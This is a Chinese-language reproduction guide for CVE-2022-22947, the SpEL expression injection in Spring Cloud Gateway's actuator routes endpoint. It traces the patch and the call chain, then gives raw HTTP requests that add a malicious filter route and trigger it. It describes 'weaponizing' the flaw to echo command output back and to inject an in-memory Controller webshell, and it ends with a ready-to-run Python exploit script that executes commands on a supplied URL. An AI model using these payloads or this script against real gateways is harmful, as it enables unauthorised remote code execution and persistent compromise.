# Spring Cloud Gateway表达式注入 远程命令执行漏洞 CVE-2022-22947

## 漏洞描述

Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。

近日VMware官方发布了Spring Cloud Gateway存在SPEL表达式注入漏洞CVE-2022-22947，可导致未授权远程命令执行漏洞：

## 漏洞影响

<a-checkbox checked>Spring Cloud Gateway < 3.1.1</a-checkbox></br>

<a-checkbox checked>Spring Cloud Gateway < 3.0.7</a-checkbox></br>

<a-checkbox checked>Spring Cloud Gateway 其他已不再更新的版本</a-checkbox></br>

## 网络测绘

app="vmware-SpringBoot-Framework"</a-checkbox></br>

## 漏洞复现

可以从Github下载存在漏洞的版本v3.1.0，然后用idea载入：

![img](../../../.vuepress/public/img/1647573307526-2e0e8717-9a10-4305-b9f4-2d0ecc6f0b81.png)

<br/>

从漏洞通报来看，这是一个SPEL表达式注入漏洞，对比补丁`org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue`：

![img](../../../.vuepress/public/img/1647573330085-566ca2e2-719a-488a-aaf6-42461c34123a.png)

![img](../../../.vuepress/public/img/1647573348150-d8d6e878-6215-4f0f-9b1a-1bdfc10ace05.png)

<br/>

新版本将`getValue`函数中的`StandardEvaluationContext`替换成了`SimpleEvaluationContext`，从而修复了SPEL表达式注入。寻找`getValue`函数被调用的情况

![img](../../../.vuepress/public/img/1647573359290-e7054815-361f-40f4-b079-73ca1558652c.png)



<br/>

只在枚举值`ShortcutType`的三个取值（`DEFAULT`、`GATHER_LIST`、`GATHER_LIST_TAIL_FLAG`）中被调用：

![img](../../../.vuepress/public/img/1647573373383-2db3fe98-8f67-4b6d-99a1-62078a426be4.png)



<br/>

三个调用类似，以`DEFAULT`为例，继续寻找调用关系：

![img](../../../.vuepress/public/img/1647573389339-bfd6ed2a-0a74-419b-879a-9b8e23714deb.png)

一直定位到`RouteDefinitionLocator#convertToRoute`：

![img](../../../.vuepress/public/img/1647573404242-a29e06ef-0d7e-4c0c-a6d3-29e34a0e3eab.png)

<br/>

尝试根据`RouteDefinition`提取`GatewayFilter`列表。这里的调用和路由以及过滤规则有关，查看Spring Cloud Gateway路由相关的接口定义：

![img](../../../.vuepress/public/img/1647573426047-9b408805-d6a9-426d-9953-3ad0688747b5.png)

<br/>

定位处理控制器`org.springframework.cloud.gateway.actuate.AbstractGatewayControllerEndpoint`：

![img](../../../.vuepress/public/img/1647573440443-cfbaf262-a8ca-4455-a14d-c9289318b002.png)

<br/>

POST输入参数为`RouteDefinition`类型，与上面调用链中的`convertToRoute`函数的输入参数类型一致。

查看`RouteDefinition`定义：

![img](../../../.vuepress/public/img/1647573460075-ec905926-3451-4543-b403-25406b2f80cd.png)

<br/>

注意列表型变量`FilterDefinition`的定义：

![img](../../../.vuepress/public/img/1647573471856-84de7feb-84c0-43d4-a9dc-6a08ac81c085.png)

<br/>

参考`RouteDefinition`变量的定义很容易出构造POST测试请求：

```powershell
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:9000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 166

{
  "id": "id",
  "filters": [{
    "name": "123456",
    "args": {}
  }],
  "uri": "http://localhost"
}
```

触发断点：

![img](../../../.vuepress/public/img/1647573500724-a690d7a7-8c6a-42bc-94ea-51909fe208ad.png)

<br/>

首先会通过函数`validateRouteDefinition`对参数进行了检查：

![img](../../../.vuepress/public/img/1647573512207-7a45481a-fbe8-4f30-a54d-8be6301e3e20.png)

<br/>

进入验证函数`isAvailable`：

![img](../../../.vuepress/public/img/1647573523778-8db7a44f-3aa5-4936-b65e-d6e99a73139d.png)

代码中会验证`Filter`的`name`属性是否合法，合法列表整理如下：

```powershell
class org.springframework.cloud.gateway.filter.factory.AddRequestHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.MapRequestHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.AddRequestParameterGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.AddResponseHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.rewrite.ModifyRequestBodyGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.DedupeResponseHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.rewrite.ModifyResponseBodyGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.CacheRequestBodyGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.PrefixPathGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.PreserveHostHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RedirectToGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RemoveRequestHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RemoveRequestParameterGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RemoveResponseHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RewritePathGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RetryGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.SetPathGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.SecureHeadersGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.SetRequestHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.SetRequestHostHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.SetResponseHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RewriteResponseHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RewriteLocationResponseHeaderGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.SetStatusGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.SaveSessionGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.StripPrefixGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RequestHeaderToRequestUriGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RequestSizeGatewayFilterFactory
class org.springframework.cloud.gateway.filter.factory.RequestHeaderSizeGatewayFilterFactory
```

<br/>

可以随意选择其中的一个`GatewayFilterFactory`，比如利用`Retry`来修改请求包：

```powershell
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:9000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 181

{
  "id": "1234567",
  "filters": [{
    "name": "Retry",
    "args": {
"a":"payload"
   }
  }],
  "uri": "http://localhost"
}
```

<br/>

请求后显示路由创建成功。可以通过refresh来生效：

```json
POST /actuator/gateway/refresh HTTP/1.1
Host: 127.0.0.1:9000
Connection: close
```

<br/>

成功触发表达式解析：

![img](../../../.vuepress/public/img/1647573597584-9b9bc011-190f-4562-ac76-9e67d0b7945f.png)



### 武器化一：命令回显

<br/>通过调试发现，在refresh路由时会调用对应`GatewayFilter`的`apply`函数。当成功创建新的路由后，可以通过GET请求获取配置信息：

![img](../../../.vuepress/public/img/1647573625150-6beef741-5360-4a88-be27-bfbbba9d2664.png)

<br/>回顾前面合法的`GatewayFilter`列表，我们发现存在一个名为`AddResponseHeaderGatewayFilterFactory`的子类：

![img](../../../.vuepress/public/img/1647573637082-848734d6-27d1-49ba-a286-8b229ccd2796.png)

![img](../../../.vuepress/public/img/1647573647822-ba74606e-4f36-447c-be21-611899cd401f.png)

<br/>`apply`函数会将配置信息写入HTTP响应数据包中，所以可以尝试利用`AddResponseHeaderGatewayFilterFactory`来构造命令回显请求：

![img](../../../.vuepress/public/img/1647573666113-f9fcd7ca-6fff-4527-829e-d07ca34db54d.png)

<br/>refresh执行SPEL表达式，将结果写入HTTP响应流，然后访问创建的路由，可以将命令执行的结果回显出来：

![img](../../../.vuepress/public/img/1647573683357-9c3bcbb7-1e3a-45ab-b92d-0d1ada0f615d.png)

<br/>最后可以发送DELETE请求将创建的新路由删除。

### 武器化二：Spring Controller内存马

<br/>CVE-2022-22947是一个SPEL表达式注入漏洞，并且框架基于Spring Framework实现，所以我们考虑通过漏洞注入Spring内存马。Spring可以在Controller、Interceptor等不同层级构建不同的内存马

```json
本文尝试构造Spring Controller内存马。Spring可以通过`RequestMappingHandlerMapping`来完成`@Contoller`和`@RequestMapping`注解，这里有两个比较关键的类：

`RequestMappingInfo`：一个封装类，对一次http请求中的相关信息进行封装
`HandlerMethod`：对Controller的处理请求方法的封装，里面包含了该方法所属的bean、method、参数等对象

函数`RequestMappingHandlerMapping#registerHandlerMethod`可以将Controller函数与`RequestMappingInfo`对象关联起来。首先寻找`RequestMappingHandlerMapping`对象。我们可以尝试在内存中搜索，借助`java-object-searcher`搜索，结果如下：
```

![img](../../../.vuepress/public/img/1647573785505-7c1037a5-d149-42a4-b792-f7e3f0a6276a.png)

![img](../../../.vuepress/public/img/1647573792434-78a09b7b-fd34-463b-85e4-fc9e1c887fab.png)

<br/>除了上面通过`Thread`的方式提取`RequestMappingInfo`之外，通过观察SPEL表达式解析的代码发现上下文环境存在`beanFactory`的对象：

![img](../../../.vuepress/public/img/1647573803599-990e0a0d-00ef-4a93-a5b1-e79a07cbe2a5.png)

![img](../../../.vuepress/public/img/1647573814295-a29abe86-bc09-435c-a7d4-04bc1ee9ba78.png)

<br/>存有337个Bean对象信息，可以利用下面代码辅助打印结果：

```json
for(int i = 0; i<((DefaultListableBeanFactory) beanFactory).beanDefinitionNames.toArray().length; i++){
    System.out.println(((DefaultListableBeanFactory) beanFactory).beanDefinitionNames.toArray()[i]);
}
```

![img](../../../.vuepress/public/img/1647573882630-988bce83-ebb7-4cb1-bedc-f64f13e1d7fb.png)

![img](../../../.vuepress/public/img/1647573890270-d0d7d0d6-480b-4077-a0b5-8288eeaf5c7d.png)

<br/>直接利用SPEL上线文环境中的`beanFactory`即可获取`RequestMappingHandlerMapping`对象。SPEL表达式中可以通过`@`来获取`BeanResolver`配置的beans对象：

![img](../../../.vuepress/public/img/1647573902389-661a5cf0-e59b-4c70-8f77-0dc4281f6688.png)

<br/>接下来创建内存马的过程就很简单了，最终效果就是将如下自定义的`Controller`子类通过SPEL表达式注入到内存并通过`RequestMappingHandlerMapping`对象完成路由注册：

![img](../../../.vuepress/public/img/1647573912918-962092be-759d-488b-bc77-b6960a4b2cab.png)

<br/>构造完新的payload后，发送数据包：

![img](../../../.vuepress/public/img/1647573923086-32cab28a-86da-4cab-98fd-3405742b5d95.png)

<br/>refresh后将注入内存马：

![img](../../../.vuepress/public/img/1647573937710-577aedc0-9571-4868-b4fc-fd753abe0de9.png)

<br/>最后同样记得发送DELETE请求将创建的路由删除。

## 漏洞POC

<a-alert type="success" message="https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947/blob/main/spring_cloud_RCE.py" description="" showIcon>
</a-alert>
<br/>

```python
import requests
import json
import sys


def exec(url):

    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    ## command to execute replace "id" in payload

    payload = '''{\r
      "id": "hacktest",\r
      "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
        }],\r
      "uri": "http://example.com",\r
      "order": 0\r
    }'''

   

    
    re1 = requests.post(url=url + "/actuator/gateway/routes/hacktest",data=payload,headers=headers1,json=json)
    re2 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)
    re3 = requests.get(url=url + "/actuator/gateway/routes/hacktest",headers=headers2)
    re4 = requests.delete(url=url + "/actuator/gateway/routes/hacktest",headers=headers2)
    re5 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)
    print(re3.text)


if __name__ == "__main__":
  print('''   ██████  ██      ██ ████████        ████   ████   ████   ████         ████   ████   ████     ██  ██████
  ██░░░░██░██     ░██░██░░░░░        █░░░ █ █░░░██ █░░░ █ █░░░ █       █░░░ █ █░░░ █ █░░░ █   █░█ ░░░░░░█
 ██    ░░ ░██     ░██░██            ░    ░█░█  █░█░    ░█░    ░█      ░    ░█░    ░█░█   ░█  █ ░█      ░█
░██       ░░██    ██ ░███████  █████   ███ ░█ █ ░█   ███    ███  █████   ███    ███ ░ ████  ██████     █ 
░██        ░░██  ██  ░██░░░░  ░░░░░   █░░  ░██  ░█  █░░    █░░  ░░░░░   █░░    █░░   ░░░█  ░░░░░█     █  
░░██    ██  ░░████   ░██             █     ░█   ░█ █      █            █      █        █       ░█    █   
 ░░██████    ░░██    ░████████      ░██████░ ████ ░██████░██████      ░██████░██████  █        ░█   █    
  ░░░░░░      ░░     ░░░░░░░░       ░░░░░░  ░░░░  ░░░░░░ ░░░░░░       ░░░░░░ ░░░░░░  ░         ░   ░     
 ██                   ██                 ██                              
░██       ██   ██    ░██                ░██                              
░██      ░░██ ██     ░██ ██   ██  █████ ░██  ██  ██████  ███████   █████ 
░██████   ░░███      ░██░██  ░██ ██░░░██░██ ██  ██░░░░██░░██░░░██ ██░░░██
░██░░░██   ░██    ██ ░██░██  ░██░██  ░░ ░████  ░██   ░██ ░██  ░██░███████
░██  ░██   ██    ░░  ░██░██  ░██░██   ██░██░██ ░██   ░██ ░██  ░██░██░░░░ 
░██████   ██      ██ ███░░██████░░█████ ░██░░██░░██████  ███  ░██░░██████
░░░░░    ░░      ░░ ░░░  ░░░░░░  ░░░░░  ░░  ░░  ░░░░░░  ░░░   ░░  ░░░░░░ 
usage: python3 test.py url
''')
  if(len(sys.argv)>1):
    url = sys.argv[1]
    exec(url)
  else:
    exit()
```

## 参考文章

<a-alert type="success" message="https://mp.weixin.qq.com/s/lKKOUvWqU1Qpexus5u_3Uw" description="" showIcon>
</a-alert>
<br/>